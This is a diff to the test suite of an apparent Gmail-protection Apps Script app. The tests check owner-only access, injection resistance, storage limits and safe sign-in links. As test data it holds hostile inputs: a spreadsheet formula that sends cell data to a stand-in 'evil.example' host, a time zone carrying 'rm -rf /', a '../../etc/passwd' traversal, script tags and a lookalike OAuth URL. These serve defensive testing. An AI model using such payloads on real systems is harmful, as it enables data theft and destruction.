@@ -19,7 +19,8 @@ test('only the owner can use the dashboard and its API', () => {
     const page = app.doGet({ parameter: {} });
     assert.match(page.getContent(), /Not allowed/);
     assert.doesNotMatch(page.getContent(), /google\.script\.run/);
-    assert.ok(env.cells('Activity').some((row) => row[1] && row[1].v === 'Access denied'), 'denied access is logged');
+    assert.ok(app.recentActivity_(5).some((a) => a.event === 'Access denied'), 'denied access is logged');
+    assert.doesNotMatch(page.getContent(), /accounts\.google\.com/, 'no permission link unless Google actually needs one');
   }
   const { app } = loadApp();
   const page = app.doGet({ parameter: {} });
@@ -41,14 +42,15 @@ test('the page can only call the intended functions; everything else is private'
   for (const src of [CODE, DETECT]) for (const m of src.matchAll(/^function\s+([A-Za-z0-9_$]+)/gm)) if (!m[1].endsWith('_')) publicFns.add(m[1]);
   const allowed = new Set(['setup', 'turnOff', 'runGuard', 'runNightly', 'runScanBatch', 'doGet', 'apiOverview', 'apiQuarantine', 'apiQuarantineAction',
     'apiReview', 'apiReviewDecision', 'apiWebsites', 'apiCountFrom', 'apiWebsiteAction', 'apiOutgoing', 'apiDeleteDrafts', 'apiSettings',
-    'apiSaveSettings', 'apiSetKey', 'apiUpdateList', 'apiCheckNow', 'apiTurnOff']);
+    'apiSaveSettings', 'apiSetKey', 'apiUpdateList', 'apiCheckNow', 'apiTurnOff', 'apiTurnOn']);
   assert.deepEqual([...publicFns].sort(), [...allowed].sort());
   for (const name of publicFns) {
     if (!name.startsWith('api')) continue;
     const body = CODE.slice(CODE.indexOf('function ' + name + '('), CODE.indexOf('\n}\n', CODE.indexOf('function ' + name + '(')));
     assert.match(body, /return guarded_\(/, name + ' must go through the owner check');
   }
-  assert.match(CODE, /function turnOff\(\) \{\n  requireOwner_\(\);/, 'turnOff checks the owner too');
+  assert.match(CODE, /function turnOff\(\) \{\n  requireUser_\(\);/, 'turnOff checks the owner too');
+  assert.match(CODE, /function setup\(\) \{ requireUser_\(\);/, 'setup checks the owner too');
 });
 
 test('Gmail search injection: a crafted address cannot widen a delete', () => {
@@ -60,26 +62,47 @@ test('Gmail search injection: a crafted address cannot widen a delete', () => {
   }
   assert.ok(!env.queries.some((q) => /anywhere|is:starred \)|label:work/.test(q)), 'no injected search ever ran');
   assert.equal(app.fromQuery_('News@Shop.co.za'), 'from:news@shop.co.za');
-  // A tampered review item: the delete search comes from the key's checked parts, never from the sheet.
+  // A tampered review item: the delete search comes from the key's checked parts, never from stored text.
   assert.throws(() => app.reviewQuery_('sender:a@b.com OR is:starred', app.getSettings_()), /not a valid/);
   assert.throws(() => app.reviewQuery_('rule:everything', app.getSettings_()), /Unknown review item/);
   assert.match(app.reviewQuery_('rule:promotions', app.getSettings_()), /-is:starred -is:important -has:userlabels/);
 });
 
-test('formula injection: sender names and subjects can never become formulas in your sheet', () => {
+test('stored text comes back exactly as it went in (formulas, scripts, emoji, other alphabets)', () => {
   const { app, env } = loadApp();
-  const evil = '=IMPORTXML("https://evil.example/?q="&A1,"//a")';
-  const t = env.addThread(makeMessage({ from: `"${evil}" <news@shop.example>`, subject: '+HYPERLINK("https://evil.example","x")',
+  const evil = '=IMPORTXML("https://evil.example/?q="&A1,"//a") <script>x</script> \u{1F600} Привет \u2028 "quotes" \\ back';
+  const t = env.addThread(makeMessage({ from: `"${evil}" <news@shop.example>`, subject: '+HYPERLINK("x")',
     headers: { 'List-Unsubscribe': '<https://shop.example/u?id=1>' } }), { category: 'promotions' });
   const table = app.loadWebsites_();
   app.aggregate_(table, t.getMessages()[0], [OWNER]);
   app.saveWebsites_(table);
   app.log_('Test', evil, '-1+2', 5, '@SUM(A1)', 'abc');
-  for (const name of ['Websites', 'Activity']) {
-    for (const row of env.cells(name)) for (const cell of row) if (cell) assert.equal(cell.formula, false, `${name}: ${cell.v}`);
+  assert.equal(app.loadWebsites_().byEmail['news@shop.example'].name, app.clip_(evil, 60));
+  const a = app.recentActivity_(1)[0];
+  assert.equal(a.from, app.clip_(evil, 120));
+  assert.equal(a.details, '@SUM(A1)');
+  for (const [k, v] of env.props) assert.ok(Buffer.byteLength(v) <= 9216, k + ' fits in one property');
+  assert.ok([...env.props.values()].every((v) => /^[\x00-\x7f]*$/.test(v)), 'stored as plain ASCII, so a piece never splits a character');
+});
+
+test('a huge mailbox never overflows Google storage: the senders who email most are kept', () => {
+  const { app, env } = loadApp();
+  const table = app.loadWebsites_();
+  for (let i = 0; i < 3000; i++) {
+    const rec = app.newRecord_(`newsletter${i}@sender-number-${i}.example`, 'Sender ' + i + ' '.padEnd(50, 'x'), `sender-number-${i}.example`);
+    rec.emails = i; rec.last = new Date(); rec.flags.list = true;
+    rec.meta = { u: 'https://sender-number-' + i + '.example/unsubscribe?token=' + 'a'.repeat(400), m: 'mailto:u@sender-number-' + i + '.example?subject=' + 'b'.repeat(200), oc: true };
+    table.byEmail[rec.email] = rec; table.order.push(rec);
   }
-  assert.equal(app.cell_('=1+1'), "'=1+1");
-  assert.equal(app.cell_('normal'), 'normal');
+  for (let i = 0; i < 400; i++) app.log_('Dangerous', 'x'.repeat(120), 'y'.repeat(140), 90, 'z'.repeat(400), 'abc');
+  const kept = app.saveWebsites_(table);
+  assert.ok(kept >= 100 && kept <= 500, 'kept ' + kept);
+  assert.ok(env.storeBytes() <= 500 * 1024);
+  const back = app.loadWebsites_().order;
+  assert.equal(back.length, kept);
+  assert.ok(back.every((r) => r.emails >= 3000 - kept), 'the biggest senders are the ones kept');
+  assert.equal(app.recentActivity_(1000).length, app.LOG_MAX, 'the activity log is capped');
+  assert.equal(app.apiOverview().ok, true, 'everything still works when storage is nearly full');
 });
 
 test('unsubscribe links: only plain https on a public name is ever fetched or shown', () => {
@@ -168,7 +191,7 @@ test('API keys are write-only, masked, and never logged', () => {
   env.fetchResponder = (url) => new Error('Request failed for ' + url);
   const t = env.addThread(makeMessage({ from: 'x@example.org', subject: 'hi', html: '<a href="https://example.net/x">x</a>', attachments: [{ name: 'a.zip', bytes: Buffer.from('PK') }] }));
   app.runGuard();
-  const everything = JSON.stringify([...env.sheets.values()].map((s) => s.rows)) + env.logs.join(' ');
+  const everything = JSON.stringify([...env.props].filter(([k]) => !/^key_/.test(k))) + env.logs.join(' ');
   assert.ok(!everything.includes(key), 'key leaked into the logs');
   assert.ok(t);
 });
@@ -256,4 +279,51 @@ test('stored state stays inside Apps Script property limits', () => {
   assert.ok(env.props.get('guardSeen').length < 9000);
   for (let i = 0; i < 400; i++) app.markSuspiciousSender_(`sender${i}@example-domain-number-${i}.com`);
   assert.ok(env.props.get('susSenders').length < 9216);
+});
+
+test('one-file install: the pasted app runs, shows the dashboard and uses your time zone', () => {
+  const { app, env } = loadApp({ bundle: true, setup: false });
+  app.HtmlService.createHtmlOutputFromFile = () => { throw new Error('a pasted install has no Dashboard.html file'); };
+  const page = app.doGet({ parameter: {} });
+  assert.equal(page.getContent(), fs.readFileSync(new URL('../src/Dashboard.html', import.meta.url), 'utf8'));
+  const r = app.apiTurnOn('Africa/Johannesburg');
+  assert.equal(r.ok, true, r.error);
+  assert.deepEqual(env.triggers.map((t) => t.getHandlerFunction()).sort(), ['runGuard', 'runNightly', 'runScanBatch']);
+  assert.equal(env.triggers.find((t) => t.getHandlerFunction() === 'runNightly')._t.tz, 'Africa/Johannesburg');
+  assert.equal(env.props.get('owner'), OWNER);
+  assert.equal(env.scriptProps.size, 0, 'nothing is kept in shared script storage');
+});
+
+test('time zones from the page are checked; a bad one falls back safely', () => {
+  for (const bad of ['../../etc/passwd', 'Europe/London; rm -rf /', 'a'.repeat(60), '<script>', null, 42, { tz: 'x' }]) {
+    const { app, env } = loadApp();
+    assert.equal(app.apiTurnOn(bad).ok, true, String(bad));
+    assert.equal(env.props.get('tz'), undefined, 'not stored: ' + String(bad));
+  }
+  const { app, env } = loadApp();
+  assert.equal(app.apiTurnOn('Atlantis/Lost_City').ok, true, 'an unknown zone that looks valid still turns protection on');
+  assert.ok(env.triggers.some((t) => t.getHandlerFunction() === 'runNightly'), 'nightly job still scheduled');
+});
+
+test('missing Google permission: a plain message and only a Google sign-in link', () => {
+  const { app, env } = loadApp();
+  env.authRequired = true;
+  app.GmailApp.getUserLabelByName = () => { throw new Error('You do not have permission to call GmailApp.getUserLabelByName. Required permissions: https://mail.google.com/'); };
+  let r = app.apiOverview();
+  assert.equal(r.ok, false);
+  assert.match(r.error, /permission/);
+  assert.equal(r.authUrl, env.authUrl);
+  for (const bad of ['javascript:alert(1)', 'https://evil.example/oauth', 'http://accounts.google.com/x', 'https://accounts.google.com.evil.example/x']) {
+    env.authUrl = bad;
+    r = app.apiOverview();
+    assert.equal(r.authUrl, '', bad);
+  }
+  env.authUrl = 'https://accounts.google.com/o/oauth2/auth?a=1&b=2';
+  const denied = loadApp({ activeUser: '' });
+  denied.env.authRequired = true;
+  denied.env.authUrl = env.authUrl;
+  const page = denied.app.doGet({ parameter: {} }).getContent();
+  assert.match(page, /href="https:\/\/accounts\.google\.com\/o\/oauth2\/auth\?a=1&amp;b=2"/, 'link shown, escaped for HTML');
+  assert.equal(denied.app.htmlEscape_('"><script>&\''), '&quot;&gt;&lt;script&gt;&amp;&#39;');
+  assert.doesNotMatch(page, /google\.script\.run/);
 });
